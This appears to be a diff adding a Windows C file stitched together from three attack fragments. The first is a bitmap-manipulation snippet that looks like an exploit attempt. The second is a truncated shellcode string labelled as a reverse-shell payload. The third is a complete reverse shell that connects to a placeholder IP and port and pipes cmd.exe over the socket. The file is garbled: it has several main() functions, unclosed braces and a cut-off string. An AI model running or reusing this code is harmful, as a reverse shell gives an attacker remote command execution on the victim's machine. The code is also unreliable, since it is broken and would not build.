@@ -1,0 +1,62 @@
+#include <windows.h>
+#include <winsock2.h>
+#include <stdio.h>
+#include <ws2tcpip.h>
+#pragma comment(lib,"ws2_32")
+
+int main() {
+    HBITMAP hBitmap;
+    HDC hdcMem;
+    LPVOID pvScan0;
+    BITMAPINFO bmi = { sizeof(BITMAPINFOHEADER), 0, 0, 1, 32, BI_RGB };
+    BYTE bJmp[6] = { 0xEB, 0x06, 0x90, 0x90, 0x90, 0x90 };
+
+    hBitmap = CreateBitmap(1, 1, 1, 32, NULL);
+    hdcMem = CreateCompatibleDC(NULL);
+    SelectObject(hdcMem, hBitmap);
+    GetDIBits(hdcMem, hBitmap, 0, 0, NULL, &bmi, DIB_RGB_COLORS);
+    pvScan0 = VirtualAlloc(NULL, bmi.bmiHeader.biSizeImage, MEM_COMMIT, PAGE_READWRITE);
+    bmi.bmiHeader.biCompression = BI_JPEG;
+    memcpy((PBYTE)pvScan0 + bmi.bmiHeader.biSizeImage - 6, bJmp, 6);
+    SetDIBits(hdcMem, hBitmap, 0, 1, pvScan0, &bmi, DIB_RGB_COLORS);
+    
+int main(int argc, char** argv)
+{
+    WSADATA wsaData;
+    SOCKET s;
+    SOCKADDR_IN server;
+    STARTUPINFO sInfo;
+    PROCESS_INFORMATION pInfo;
+
+    // Reverse shell payload
+    char* shellcode = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x1f\x90\xc0\xa8\x00\x66\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x02\x59\x50\x50\x4d\x31\xc9\x
+
+int main()
+{
+    // Setup reverse shell payload
+    WSADATA wsaData;
+    SOCKET Winsock;
+    sockaddr_in addr;
+    STARTUPINFOA sInfo;
+    PROCESS_INFORMATION pInfo;
+
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+
+    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = inet_addr("192.168.0.1"); // Your IP address here
+    addr.sin_port = htons(1234); // Your listening port here
+
+    WSAConnect(Winsock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL);
+
+    memset(&sInfo, 0, sizeof(sInfo));
+    sInfo.cb = sizeof(sInfo);
+    sInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+    sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)Winsock;
+
+    char* szCmdline = "cmd.exe"; // Command line to execute
+
+    CreateProcessA(NULL, szCmdline, NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo);
+
+    return 0;
+}
